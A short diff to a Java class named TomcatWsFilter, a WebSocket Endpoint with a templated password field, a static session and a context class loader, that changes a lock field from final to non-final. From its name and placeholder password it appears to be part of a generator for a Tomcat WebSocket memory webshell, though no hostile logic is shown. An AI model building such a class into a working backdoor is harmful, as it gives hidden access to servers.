@@ -12,7 +12,7 @@ public class TomcatWsFilter extends Endpoint
     private static String password = "/{password}";
 
     private static Session session = null;
-    private static final Object lock = new Object();
+    private static Object lock = new Object();
 
     private ClassLoader getLoader() {{
         return Thread.currentThread().getContextClassLoader();
